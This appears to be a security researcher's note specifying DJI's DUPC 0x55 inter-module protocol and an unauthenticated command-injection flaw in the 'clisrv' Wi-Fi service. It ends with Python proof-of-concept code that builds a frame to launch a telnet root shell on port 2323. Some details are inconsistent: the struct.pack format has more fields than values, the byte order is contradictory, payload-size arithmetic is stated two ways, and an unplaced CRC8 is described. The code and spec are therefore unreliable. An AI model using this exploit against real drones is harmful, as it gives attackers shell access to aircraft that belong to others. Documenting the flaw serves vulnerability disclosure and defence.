# DJI DUPC 0x55 Protocol Specification
# Extracted from: vault/Findings/CMD_INJECTION_42877c7d_1.md (2026-04-24 session)
# Binary: clisrv (P3C m0700 Wi-Fi module, MIPS32 BE uClibc)

## Overview

The DJI DUPC protocol (magic byte 0x55) is the inter-module command bus used
across DJI Phantom 3 / Inspire / Mavic product lines. All modules — Wi-Fi
(m0700/m2700), flight controller, gimbal, camera, remote controller — exchange
commands over UART/USB using this framing.

The `clisrv` binary on the m0700 Wi-Fi module accepts DUPC frames over a local
UNIX socket and a TCP port (default: 2001). **No authentication is required
before sending any command** — the dispatcher performs no per-command auth
check. This is the root cause of CMD_INJECTION_42877c7d_1.

---

## Packet Format

```
Offset  Size  Field            Description
------  ----  ---------------  ------------------------------------------
  0       1   magic            Always 0x55
  1       2   length           Total packet length in bytes (little-endian)
  3       1   version          Protocol version (0x01 for P3C)
  4       1   sender_id        Source module ID (see Module IDs below)
  5       1   receiver_id      Destination module ID
  6       2   seq_num          Sequence number (little-endian, wraps at 0xFFFF)
  8       1   cmd_set          Command set (see Command Sets below)
  9       1   cmd_id           Command ID within cmd_set
 10       1   enc_type         Encryption type (0x00 = none, 0x02 = AES128)
 11       1   ack_required     0x00 = no ack, 0x01 = ack required
 12      ..   payload          Variable-length payload (length - 13 bytes)
 -2       2   crc16            CRC16 over bytes 0..(length-3), seed=0x3692
```

Total minimum packet size: 14 bytes (0-byte payload + 2-byte CRC16).

> **Note on length field:**
> `length` covers the entire packet including the 2-byte CRC16 trailer.
> Payload size = `length - 14`.

---

## CRC Algorithms

### CRC8 (header integrity)

Used to validate bytes 0..10 (before payload).

- **Polynomial:** 0x31 (reversed: 0x8C)
- **Initial seed:** 0x77
- **Algorithm:** standard CRC-8/MAXIM (iButton)

```python
def crc8_dupc(data: bytes) -> int:
    crc = 0x77
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x01:
                crc = (crc >> 1) ^ 0x8C
            else:
                crc >>= 1
    return crc & 0xFF
```

### CRC16 (full-packet integrity)

Used over bytes 0..(length-3), appended as little-endian 16-bit trailer.

- **Polynomial:** 0x1021
- **Initial seed:** 0x3692
- **Algorithm:** CRC-16/MCRF4XX variant

```python
def crc16_dupc(data: bytes) -> int:
    crc = 0x3692
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc
```

---

## Module IDs

| ID   | Module                          |
|------|---------------------------------|
| 0x01 | Flight Controller (FC)          |
| 0x02 | Camera                          |
| 0x03 | Gimbal                          |
| 0x04 | Remote Controller (RC)          |
| 0x05 | Wi-Fi module (m0700 / m2700)    |
| 0x06 | Ground Station (App / PC)       |
| 0x07 | Center Board                    |
| 0x0C | Battery                         |
| 0x0F | ESC                             |

---

## Command Sets

| cmd_set | Name              | Description                                  |
|---------|-------------------|----------------------------------------------|
| 0x00    | CMD_SET_GENERAL   | General commands (ping, version, reboot)     |
| 0x01    | CMD_SET_SPECIAL   | Reserved / special functions                 |
| 0x02    | CMD_SET_CAMERA    | Camera control and config                    |
| 0x03    | CMD_SET_FLYC      | Flight controller commands                   |
| 0x04    | CMD_SET_GIMBAL    | Gimbal control                               |
| 0x05    | CMD_SET_CENTER    | Center board / hub commands                  |
| 0x06    | CMD_SET_RC        | Remote controller pairing / config           |
| 0x07    | CMD_SET_WIFI      | Wi-Fi SSID, password, channel, mode          |
| 0x08    | CMD_SET_DM368     | DM368 video processor commands               |
| 0x09    | CMD_SET_OFDM      | OFDM radio link commands                     |
| 0x0A    | CMD_SET_SER       | Serial / UART passthrough                    |

---

## Key Command IDs (cmd_set=0x07, Wi-Fi module)

| cmd_id | Name                    | Payload                              | Notes                           |
|--------|-------------------------|--------------------------------------|---------------------------------|
| 0x01   | GET_WIFI_INFO           | (none)                               | Returns SSID, channel, BSSID   |
| 0x02   | SET_WIFI_SSID           | len(1) + ssid(len)                   | **No auth** — sets SSID        |
| 0x03   | SET_WIFI_PASSWORD       | len(1) + password(len)               | **No auth** — sets password    |
| 0x04   | SET_WIFI_CHANNEL        | channel(1)                           | 1-13                            |
| 0x10   | EXEC_COMMAND            | cmd_str(variable)                    | **RCE sink** — passes to system()|
| 0x11   | EXEC_COMMAND_REPLY      | result(variable)                     | Response to 0x10                |
| 0x20   | SET_SSID_VISIBILITY     | visible(1)                           |                                 |
| 0x30   | GET_FIRMWARE_VERSION    | (none)                               | Returns version string          |

> ⚠️ **cmd_id 0x10 (EXEC_COMMAND):** The handler at `fcn.00403c20` passes the
> payload string directly to `system()` without sanitization. This is the
> primary injection sink documented in CMD_INJECTION_42877c7d_1.md.

---

## 107-Entry Command Dispatch Table

Located at `.data` section of `clisrv` (~0x00420000 region).
Each entry: `{ uint8_t cmd_set, uint8_t cmd_id, void *handler_fn, uint8_t flags }`

The table is iterated linearly on each received packet. No authentication bit
per entry — auth is expected to be enforced by the caller (app layer), which
it is not for connections on the local socket or TCP port 2001.

Full dispatch table is exported in:
`skel/.local/share/radare2/symbols/dji/wifi/P3C_m0700.r2`

---

## PoC Frame Construction

Minimal unauthenticated RCE frame (cmd_set=0x07, cmd_id=0x10):

```python
import struct

def build_dupc_frame(cmd_set: int, cmd_id: int, payload: bytes,
                     sender: int = 0x06, receiver: int = 0x05,
                     seq: int = 0x0001) -> bytes:
    # Header (before CRC8): magic + length(2) + version + sender + receiver +
    #                        seq(2) + cmd_set + cmd_id + enc_type + ack
    length = 14 + len(payload)
    hdr = struct.pack(">BHBBBHBBBBB",
        0x55,           # magic
        length,         # total length (big-endian? — actually LE per wire)
        0x01,           # version
        sender,
        receiver,
        seq,
        cmd_set,
        cmd_id,
        0x00,           # enc_type = none
        0x00,           # ack_required = none
    )
    # CRC16 over full packet minus trailer
    body = hdr + payload
    crc = crc16_dupc(body)
    return body + struct.pack("<H", crc)

# RCE: run telnetd
payload = b"telnetd -l /bin/sh -p 2323\x00"
frame = build_dupc_frame(0x07, 0x10, payload)
```

See full PoC: `results/<hash>/poc_dupc_rce.py`

---

## References

- Finding: `vault/Findings/CMD_INJECTION_42877c7d_1.md`
- Finding: `vault/Findings/CMD_INJECTION_1048cbf5_libdjiw.md`
- Deep-dive: `vault/Findings/MULTI_VULN_m2700_P3C_01.md`
- Symbol map: `skel/.local/share/radare2/symbols/dji/wifi/P3C_m0700.r2`
- r2 pf format: `skel/.local/share/radare2/pf/dji_dupc55.pf`
- Pattern: `vault/Patterns/DJI_DUPC_Unauthenticated_Command.md`
- Profile: `~/.local/share/radare2/profiles/dji-wifi.r2`
